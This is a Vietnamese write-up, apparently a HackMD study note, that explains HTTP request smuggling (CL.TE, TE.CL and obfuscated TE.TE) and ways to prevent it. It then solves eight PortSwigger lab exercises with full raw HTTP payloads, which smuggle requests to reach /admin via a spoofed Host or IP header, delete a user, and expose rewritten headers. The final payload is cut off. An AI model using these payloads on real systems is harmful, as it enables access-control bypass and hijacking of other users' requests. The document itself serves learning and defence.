---
title: 'Web15: HTTP request smuggling'
tags: [web15]

---

I. Đặt vấn đề
-------------
### 1\. HTTP request smuggling là gì?

**HTTP request smuggling (chèn lén yêu cầu HTTP)** là một lỗ hổng bảo mật xảy ra khi có sự không nhất quán trong cách các máy chủ và proxy HTTP xử lý và phân tích cú pháp các yêu cầu HTTP. Điều này cho phép kẻ tấn công chèn lén các yêu cầu HTTP độc hại mà không bị phát hiện.
![image](https://hackmd.io/_uploads/Bk27Z7zOC.png)

Lỗ hổng này thường liên quan tới các yêu cầu HTTP/1. Tuy nhiên, các trang web hỗ trợ HTTP/2 có thể dễ bị tấn công, tùy thuộc vào kiến trúc back-end của chúng.

### 2\. Điều gì xảy ra trong 1 cuộc tấn công HTTP request smuggling?
**HTTP request smuggling** xảy ra khi một yêu cầu HTTP được gửi từ máy khách tới một máy chủ proxy và sau đó được chuyển tiếp tới một máy chủ backend. Do sự không nhất quán trong cách phân tích cú pháp các yêu cầu HTTP giữa proxy và máy chủ backend, kẻ tấn công có thể chèn một yêu cầu độc hại vào luồng yêu cầu hợp lệ, dẫn đến các hành vi không mong muốn như: 
* Thực hiện các yêu cầu độc hại mà không bị phát hiện. 
* Gây xung đột trong xử lý phiên. 
* Lợi dụng quyền hạn của người dùng hợp pháp.

![image](https://hackmd.io/_uploads/S1bD-7MuA.png)
![image](https://hackmd.io/_uploads/HyAP-7fdA.png)

Ở đây, attacker khiến một phần front-end request được máy chủ back-end hiểu là phần bắt đầu của request tiếp theo. Sau đó, khiến back-end hiểu nhầm và xử lí yêu cầu được attacker "chèn lén" vào như 1 request riêng biệt.

### 3\. HTTP request smuggling phát sinh như thế nào?

Các ứng dụng web ngày nay thường sử dụng chuỗi máy chủ HTTP giữa người dùng và backend. Người dùng gửi yêu cầu đến máy chủ **front-end** (thường là các máy chủ cân bằng tải hoặc là **reverse proxy**), sau đó mới gửi tới máy chủ **back-end**.

Hầu hết các lỗ hổng **HTP Request Smuggling** bị phát sinh do xoay quanh hai yếu tố trong header của gói tin HTTP đó là: **Content-Length** và **Transfer-Encoding**

**Content-Length** là kích thước của phần body theo đơn vị byte.
Ví dụ 1 request có phần body có kích thước 11 bytes:
![image](https://hackmd.io/_uploads/BkC_VQzuC.png)

Trường **Transfer-Encoding** thì chỉ ra kiểu truyền tải nào được áp dụng tới phần thân thông báo để cho việc truyền tải một cách an toàn giữa người gửi và người nhận. Ta sẽ nói đến kiểu **chunked**. Nghĩa là khi server không biết chính xác kích thước phần body request, **chunked** sẽ chia phần body thành các khối. Mỗi chunk bao gồm kích thước đoạn theo byte (được biểu thị bằng hệ thập lục phân hexa), theo sau là dòng mới, tiếp theo là nội dung đoạn. Message được kết thúc bằng **một đoạn có kích thước bằng 0**.
![image](https://hackmd.io/_uploads/SJ4wr7GuC.png)

Theo đặc tả, HTTP/1 cung cấp **hai** phương pháp khác nhau để xác định độ dài của các thông điệp HTTP, một thông điệp có thể sử dụng cả hai phương pháp cùng một lúc, dẫn đến xung đột với nhau. Đặc tả cố gắng ngăn chặn vấn đề này bằng cách quy định rằng nếu cả header `Content-Length` và `Transfer-Encoding` đều có mặt, thì header `Content-Length` nên bị bỏ qua. Điều này có thể đủ để tránh sự mơ hồ khi chỉ có một máy chủ tham gia, nhưng không phải khi hai hoặc nhiều máy chủ được kết nối với nhau. Trong tình huống này, các vấn đề có thể phát sinh vì hai lý do:
* Một số máy chủ không hỗ trợ tiêu đề `Transfer-Encodin`g trong các request. 
* Một số máy chủ hỗ trợ tiêu đề `Transfer-Encodin`g có thể bị dẫn dụ không xử lý nó nếu tiêu đề bị obfuscated theo một cách nào đó. 

Nếu các máy chủ front-end và back-end hành xử khác nhau liên quan đến  header (có thể bị làm mờ), thì chúng có thể không đồng ý về ranh giới giữa các request kế tiếp nhau, dẫn đến các lỗ hổng request smuggling.

### 4\. **Cách thực hiện tấn công HTTP request smuggling**

Tấn công **HTTP Request Smuggling** nói chung đều xoay quanh đến hai header là **Content-Length** và **Transfer-Encoding** trên cùng một gói tin HTTP để máy chủ **front-end** và **back-end** xử lý yêu cầu theo cách khác nhau. Sau đây là một số “combo” thường gặp của **HTTP Request Smuggling**:

**`CL.TE`**: máy chủ **front-end** sử dụng header **Content-Length** và máy chủ **back-end** sử dụng header **Transfer-Encoding**.  
**`TE.CL`**: máy chủ **front-end** sử dụng header **Transfer-Encoding** và máy chủ **back-end** sử dụng header **Content-Length**.  
**`TE.TE`**: máy chủ **front-end** và **back-end** đều hỗ trợ header **Transfer-Encoding**, nhưng một trong hai loại máy chủ không xử ý được header này, do gói tin HTTP đã bị làm xáo trộn header theo một cách nào đó.

**Dạng 1: Tấn công `CL.TE`**:

Ở đây, máy chủ **front-end** sử dụng header **Content-Length** và máy chủ **back-end** sử dụng header **Transfer-Encoding**. Ta tiến hành tấn công **HTTP Request Smuggling** như sau:
![image](https://hackmd.io/_uploads/r1OdwXM_A.png)

Máy chủ front-end xử lý header `Content-Length` và xác định rằng phần body của request có kích thước 13 byte (bao gồm cả các kí tự xuống dòng `\n`), kết thúc ở phần `SMUGGLED`. Yêu cầu này được chuyển tiếp tới máy chủ back-end. 
Máy chủ back-end xử lý header `Transfer-Encoding`, và do đó coi body thông điệp sử dụng **mã hóa chunked**. Nó xử lý khối đầu tiên, được xác định là có độ dài bằng `0`=> do đó được coi là kết thúc request. Các byte tiếp theo, `SMUGGLED`, không được xử lý và máy chủ back-end sẽ coi chúng là bắt đầu của request tiếp theo trong chuỗi.

**Dạng 2: Tấn công `TE.CL`**:

Ở đây, máy chủ front-end sử dụng header **Transfer-Encoding** và máy chủ back-end sử dụng header **Content-Length**. Ta tiến hành tấn công **HTTP Request Smuggling** như sau:
![image](https://hackmd.io/_uploads/rkDRumGOC.png)

Máy chủ front-end xử lý header `Transfer-Encoding` và do đó coi phần thân thông điệp sử dụng mã hóa chunked. Nó xử lý khối đầu tiên, được chỉ định là dài 8 byte, kết thúc ở đầu dòng tiếp theo sau `SMUGGLED`. Nó tiếp tục xử lý khối thứ hai, được chỉ định là có độ dài bằng không, và do đó được coi là kết thúc yêu cầu. Yêu cầu này được chuyển tiếp tới máy chủ back-end. 
Máy chủ back-end xử lý header `Content-Length` và xác định rằng phần thân yêu cầu dài 3 byte, kết thúc ở đầu dòng tiếp theo sau `8`. Các byte tiếp theo, bắt đầu bằng `SMUGGLED`, không được xử lý và máy chủ back-end sẽ coi chúng là bắt đầu của yêu cầu tiếp theo trong chuỗi.

**Dạng 3: Tấn công `TE.TE`** (làm xáo trộn tiêu header `TE`):

Ở đây, máy chủ **front-end** và **back-end** đều xử lý header **Transfer-Encoding**, nhưng một trong các máy chủ không xử lý được do header đã bị xáo trộn theo một cách nào đó.

Có vô số cách để làm xáo trộn header `Transfer-Encodin`g. Ví dụ:
![image](https://hackmd.io/_uploads/HJtVPBGdR.png)

Mỗi kỹ thuật này liên quan đến việc sai lệch tinh vi khỏi đặc tả HTTP. Mã thực thi trong thế giới thực, khi triển khai một đặc tả giao thức, hiếm khi tuân thủ hoàn toàn với độ chính xác tuyệt đối, và việc các triển khai khác nhau chấp nhận các biến thể khác nhau so với đặc tả là điều phổ biến. Để phát hiện lỗ hổng `TE.TE`, cần tìm một biến thể của header `Transfer-Encoding` sao cho chỉ một trong hai máy chủ, front-end hoặc back-end, xử lý nó, trong khi máy chủ còn lại bỏ qua nó. Tùy thuộc vào việc máy chủ front-end hay máy chủ back-end có thể bị dẫn dụ không xử lý header `Transfer-Encoding` bị làm mờ, phần còn lại của cuộc tấn công sẽ có dạng tương tự như các lỗ hổng `CL.TE` hoặc `TE.CL` đã được mô tả.

### 5\. **Cách phát hiện và khai thác HTTP Request Smuggling**

Nếu sử dụng **BurpSuite Pro**, ta có thể check lỗi **HTTP Request Smuggling** khi dùng với **Active Scan**, tải extension **HTTP Request Smuggler**
![image](https://hackmd.io/_uploads/By4wtrGdR.png)

Khi thực hiện thực hiện tương tác với website, extension **HTTP Request Smuggler** sẽ chủ động check lỗi cho từng request để tìm ra lỗ hổng này:
![image](https://hackmd.io/_uploads/BkoYYHfOC.png)

### 6\. **Cách ngăn chặn và phòng chống lỗ hổng HTTP Request Smuggling**
-   Cần kiểm tra xem lỗ hổng **HTTP Request Smuggling** có CVE hay tồn tại trong sản phẩm được sử dụng hay không? Liệu có sẵn bản cập nhật / bản vá cho nó hay không.
-   Giao diện người dùng phải chuẩn hóa các yêu cầu có chứa cả hai tiêu đề **Content-Length** và **Transfer-Encoding**, để chỉ một trong những tiêu đề này được sử dụng. Do đó, nếu **back-end** nhận được một yêu cầu có chứa cả hai tiêu đề bị phân khúc là **Content-Length** và **Transfer-Encoding**, thì thôi, hủy và đóng luôn kết nối TCP của gói tin yêu cầu đó luôn.
-   Nếu **HTTP Request Smuggling** xảy ra do kỹ thuật “hạ cấp” giao thức HTTP / 2 xuống version 1, thì cần đảm bảo sử dụng HTTP / 2 trong suốt thời gian, ngăn chặn việc “hạ cấp” xuống 1. Vấn đề này xem thêm về **HTTP/2 REQUEST SMUGGLING**: ([https://www.scip.ch/en/?labs.20220707](https://www.scip.ch/en/?labs.20220707))
-   Các máy chủ **front-end** có thể cho qua các request “có mùi”, tuy nhiên tới máy chủ **back-end** thì sẽ từ chối bất kỳ request nào vẫn còn mơ hồ.

II. Các bài lab
-------------

### **1. Lab: HTTP request smuggling, basic CL.TE vulnerability**
![image](https://hackmd.io/_uploads/HJz75HMdR.png)

>Truy cập bài lab, sử dụng tool **HTTP Request Smuggler** để thực hiện scan:
>![image](https://hackmd.io/_uploads/BkTq2BfO0.png)

>Phát hiện vul `CL.TE`:
>![image](https://hackmd.io/_uploads/rk3a0HGO0.png)

>Request trang chủ với method **POST**. Do đây là dạng `CL.TE` nên ta sẽ gửi request dạng:
```
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

>Lúc này, front-end server sẽ hiểu body chứa 6 kí tự bắt đầu từ kí tự `0` đến kí tự `G`, trong khi back-end server hiểu body là 1 chunk size `0` nên kết thúc request đầu và chèn kí tự `G` vào request tiếp theo.

>Gửi lần 1 (Lưu ý hạ phiên bản HTTP xuống /1.1) => `G` được coi là kí tự đầu của request tiếp theo:
>![image](https://hackmd.io/_uploads/SJAnWLM_A.png)

>Gửi lần 2, `G` ghép với `POST` của request tiếp theo thành `GPOST` → front-end server coi đó là phương thức `GPOST` và xảy ra lỗi không nhận dạng được method **"Unrecognized method GPOST"**:
>![image](https://hackmd.io/_uploads/rkRaWLMO0.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/BJbgGUM_0.png)

### **2. Lab: HTTP request smuggling, basic TE.CL vulnerability**
![image](https://hackmd.io/_uploads/SJ9FfLM_C.png)

>Thực hiện scan và phát hiện bài này thuộc dạng `TE.CL`:
>![image](https://hackmd.io/_uploads/HkG5H8GdC.png)

>Ta sẽ gửi request có dạng như sau:
```
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5a\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 13\r\n
\r\n
a\r\n
0\r\n
\r\n
```

>Lúc này, front-end server coi body là 2 chunk size `5a` và size `0`. Chunk size `5a` sẽ chứa:
```
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

a
```

>Trong khi đó, back-end server sẽ coi body có 4 kí tự `5a\r\n` => Phần còn lại sẽ được gán vào đầu request sau.

>Chú ý: Content-Length tại payload attack:

```
Content-Length: 13\r\n
\r\n
a\r\n
0\r\n
\r\n
```

>phải lớn hơn 8 ( do `a\r\n 0\r\n \r\n` có 8 kí tự) vì nếu = 8 thì request sau vẫn được xử lí bình thường, còn > 8 thì nó sẽ lấy đi một số kí tự ở request sau => lúc này mới smuggling được.

>Tắt tự động update `Content-Length`:
>![image](https://hackmd.io/_uploads/rk0GldzOR.png)

>Send request lần thứ nhất:
![image](https://hackmd.io/_uploads/ryEQawG_C.png)

>Send lần 2 ta thấy request chứa **GPOST** đã được gửi và xử lí:
>![image](https://hackmd.io/_uploads/B1xFETDMOC.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SkHS6DzdA.png)

### **3. Lab: HTTP request smuggling, obfuscating the TE header**
![image](https://hackmd.io/_uploads/B1Le7Dz_0.png)

>Khi **POST** với 2 trường `Content-Length` và `Transfer-Encoding` hợp lệ thì vẫn trả request bình thường mà không bị smuggling => Cả front-end và back-end server đều hỗ trợ `Transfer-Encoding`. Tuy nhiên, khi giá trị `Content-Length=4` sai với kích thước body mà server vẫn xử lí bình thường => `Content-Length` bị ignore nếu có cả 2 header trong cùng 1 request:
>![image](https://hackmd.io/_uploads/Hyc3X_fdC.png)

>Tuy nhiên khi thêm 1 header `Transfer-Encoding: x` thì lại trigger được smuggling sau khi gửi 2 lần. => Trong khi front-end chấp nhận `Transfer-Encoding: chunked` đầu tiên thì back-end chấp nhận `Transfer-Encoding: x` => Back-end phải sử dụng `Content-Length` do `Transfer-Encoding: x` không hợp lệ:
```
POST / HTTP/1.1
Host: 0a47004d04a13054809ad61c00ca0041.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

1
b
0


```
>![image](https://hackmd.io/_uploads/BJEc4uGdR.png)

>Trường hợp này sẽ quay về `TE.CL` và sử dụng payload:
```
POST / HTTP/1.1
Host: 0a47004d04a13054809ad61c00ca0041.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5a
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

a
0


```

>Send request lần thứ nhất:
>![image](https://hackmd.io/_uploads/SyOdBuMuA.png)

>Send lần 2 ta thấy request chứa **GPOST** đã được gửi và xử lí:
>![image](https://hackmd.io/_uploads/SJnqrdM_C.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rJuoHuzdC.png)

### **4. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**
![image](https://hackmd.io/_uploads/BJTojLmdR.png)

>Trước tiên, ta cần xác định đây là dạng gì, sau khi test với request sau thì ta biết được lab này thuộc dạng `CL.TE`:
```
POST / HTTP/1.1
Host: 0aeb005a04ca25d8803e80d5001c0054.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x


```

>Lúc này, front-end server hỗ trợ header `Content-Length` nên sẽ lấy `30` kí tự của phần body và forward sang phía back-end:
```
0

GET /404 HTTP/1.1
Foo: x
```

>Bên phía back-end server lại hỗ trợ header `Transfer-Encoding` theo kiểu `chunked` theo từng khối data, gặp kí tự kết thúc `0` nên phần còn lại của body sẽ thừa ra và nối vào request sau:
```
GET /404 HTTP/1.1
Foo: x
```

>Kết quả là request sau sẽ có dạng:
```
GET /404 HTTP/1.1
Foo: xPOST / HTTP/1.1
Host: 0aeb005a04ca25d8803e80d5001c0054.web-security-academy.net
....
```

>Phần đầu của request sau vô tình đã bị phần thừa mà ta attack ghi đè lên, kết quả là send 1 request lấy tài nguyên của đường dẫn `/404` và respone trả về `404 Not Found` do không tìm thấy tài nguyên cần tìm!!

>Kết quả send request lần 1:
>![image](https://hackmd.io/_uploads/SJntALmOA.png)

>Gửi lại lần 2:
>![image](https://hackmd.io/_uploads/Bkh50ImdC.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SJ9sA8mdC.png)

### **5. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**

>Trước tiên, ta cần xác định đây là dạng gì, sau khi test với request sau thì ta biết được lab này thuộc dạng `TE.CL`:
```
POST / HTTP/1.1
Host: 0ab800c704647cea80c99e8a00970026.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9d
GET /abc HTTP/1.1
Host: 0ab800c704647cea80c99e8a00970026.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a
0



```

> Lúc này, front-end server hỗ trợ header `Transfer-Encoding` theo kiểu `chunked`, hiểu rằng data chia thành các khối, nên sẽ forward khối có kích thước `9d` (157 kí tự, bắt đầu từ `GET` đến hết kí tự `a`, khi gặp kí tự kết thúc `0` thì dừng):
```
9d
GET /abc HTTP/1.1
Host: 0ab800c704647cea80c99e8a00970026.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a
0



```


>Bên phía back-end sẽ hỗ trỡ header `Content-Length` có kích thước gói tin là `4` nên chỉ lấy phần `9d\r\n`, còn phần thừa sẽ được nối vào request tiếp theo. Cụ thể phần bị thừa:
```
GET /abc HTTP/1.1
Host: 0ab800c704647cea80c99e8a00970026.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a
0



```

>Lúc này, khi ta gửi request tiếp theo sẽ có dạng:
```
GET /abc HTTP/1.1
Host: 0ab800c704647cea80c99e8a00970026.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a

GET / HTTP/1.1
Host: 0ab800c704647cea80c99e8a00970026.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
.............
```
>Và được chia thành 2 request riêng biệt. Do request ta attack yêu cầu tài nguyên từ đường dẫn `/abc` không tồn tại nên respone trả về là `404 Not Found` do không tìm thấy tài nguyên cần tìm!!

>Send request lần thứ nhất:
>![image](https://hackmd.io/_uploads/Skj47w7d0.png)

>Send lần 2:
>![image](https://hackmd.io/_uploads/H1eL7wmOC.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rkJvXv7dC.png)

### **6. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability**
![image](https://hackmd.io/_uploads/SyuM5P7_R.png)

>Khi truy cập trang quản trị `/admin` thì ta bị chặn:
![image](https://hackmd.io/_uploads/Sk0ZqDQuA.png)

>Ta cần xác nhận xem bài lab này thuộc dạng gì, sau khi gửi request sau:
```
POST / HTTP/1.1
Host: 0a5a009b038cd52b80ec6ccd006c00c5.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
![image](https://hackmd.io/_uploads/Bk6-iDmOC.png)

>Gửi lại lần 2:
>![image](https://hackmd.io/_uploads/H1wmiDXO0.png)

>Bên front-end server xử lí header `Content-Length: 6` sẽ lấy phần body có kích thước `6` bytes và chuyển tới back-end server:
```
0\r\n
\r\n
G
```

>Sau đó, back-end server chỉ hỗ trợ `Transfer-Encoding: chunked`, khi gặp kí tự `0` sẽ hiểu là tín hiệu kết thúc => kí tự `G` sẽ được nối vào request sau gây ra lỗi !

>Sau khi confirm được lab này thuộc dạng `CL.TE`, ta sẽ đi tạo payload để request tới `/admin`:
```
POST / HTTP/1.1
Host: 0a5a009b038cd52b80ec6ccd006c00c5.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x


```
![image](https://hackmd.io/_uploads/BkHqAwXO0.png)

>Sau khi send request 2 lần thì respone báo lỗi **Admin interface only available to local users**, ta sẽ thêm `Host: 127.0.0.1` vào xem bypass được không: 
>![image](https://hackmd.io/_uploads/BkkHk_X_A.png)

>Lần này báo lỗi **"Duplicate header names are not allowed"** do request chứa 2 header `Host` cùng lúc! Như vậy ta sẽ thử `POST /admin` với `Host: 127.0.0.1` để lúc này cắt được Host header của request sau ra. Chú ý `Content-Length` phải lớn hơn độ dài của body thực. Ở đây là 6 > 1 (`a`). Lí do là để lấy được một số kí tự của request sau để tấn công thành công!

>Sau 2 lần request thì đã hết lỗi duplicate header name! Nhưng vẫn còn lỗi **"Admin interface only available to local users":**
>![image](https://hackmd.io/_uploads/SklHZdXd0.png)

> Ta sẽ thử thay `127.0.0.1` thành các giá trị tương đương như `127.1`, `localhost`. Thử tới `localhost` thì ta thành công truy cập vào `/admin`:
```
POST / HTTP/1.1
Host: 0a5a009b038cd52b80ec6ccd006c00c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: localhost
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

a
```
> ![image](https://hackmd.io/_uploads/r19yMdXOA.png)

>Lấy đường dẫn xóa `carlos` và send lại (nhớ chỉnh sửa giá trị `Content-Length` cho đúng kích thước body):
>![image](https://hackmd.io/_uploads/S1muMOmuR.png)

>Thành công xóa được `carlos`, hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/By2FG_XdA.png)

### **7. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**
![image](https://hackmd.io/_uploads/SJ0H7_7u0.png)

>Khi truy cập vào trang quản trị `/admin` thì ta bị block:
>![image](https://hackmd.io/_uploads/SyagNd7uA.png)

>Ta xác nhận được lab này thuộc dạng `TE.CL` bằng request sau:
```
POST / HTTP/1.1
Host: 0a5b0097035db07e8199dec2007900b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9f
GET /admin HTTP/1.1
Host: 0a5b0097035db07e8199dec2007900b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a
0


```
![image](https://hackmd.io/_uploads/rkSor_XuR.png)

>Ta tiếp tục bị chặn truy cập do không phải local user **"Admin interface only available to local users"**. Tương tự lab trên, ta chỉnh sửa 1 chút Host thành `localhost` và độ dài chunk data cho đúng:
```
POST / HTTP/1.1
Host: 0a5b0097035db07e8199dec2007900b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

6f
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a
0


```
>![image](https://hackmd.io/_uploads/SkDkDu7O0.png)

>Thành công có thể truy cập `/admin`, lấy đường dẫn xóa `carlos` và send:
>![image](https://hackmd.io/_uploads/SyFmv_7OC.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/Sk9Nvd7uA.png)

>Payload sử dụng:
```
POST / HTTP/1.1
Host: 0a5b0097035db07e8199dec2007900b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

86
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

a
0


```

### **8. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting**
![image](https://hackmd.io/_uploads/rkIdFo7uC.png)

>Đầu tiên, cần xác định lab này thuộc loại gì, send request có nội dung như sau:
```
POST / HTTP/1.1
Host: 0a44003f049511988075ad0d00dd0074.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x




```
>![image](https://hackmd.io/_uploads/rkdtm37dC.png)

>Khẳng định được nó thuộc dạng `CL.TE`!

>Tiếp theo, trang web có chức năng tìm kiếm post, nó sẽ reflect hiển thị lại những gì mình điền vào bằng tham số `search`:
>![image](https://hackmd.io/_uploads/B1guNnQuC.png)
![image](https://hackmd.io/_uploads/HkKuN2Q_A.png)

>Vì response của POST search request này reflect chuỗi search =>Ta có thể tấn công HTTP Request Smuggling bằng POST với `search=` => phần request thừa sẽ được nối vào request sau => Trang web sẽ reflect `search` =>Ta xem được headers của request sau!

>Payload:
```
POST / HTTP/1.1
Host: 0a44003f049511988075ad0d00dd0074.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

search=


```

>Sau khi send request lần 2, ta sẽ xem được các header được reflect sau khi đã được front-end server xử lí:
>![image](https://hackmd.io/_uploads/rksx8nQd0.png)

>Ta lấy được header custom cho địa chỉ IP của user là `X-ixBfHN-Ip`. Thêm header này và truy cập vào `/admin` thì thông báo phải có IP `127.0.0.1` mới được truy cập:
>![image](https://hackmd.io/_uploads/SkNiLn7_A.png)

>Đổi IP thành `127.0.0.1`, ta thành công truy cập vào được trang `/admin`:
>![image](https://hackmd.io/_uploads/SJV0IhXOR.png)

>Lấy đường dẫn xóa `carlos` và send request 2 lần:
```
POST / HTTP/1.1
Host: 0a44003f049511988075ad0d00dd0074.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
X-ixBfHN-Ip: 127.0.0.1
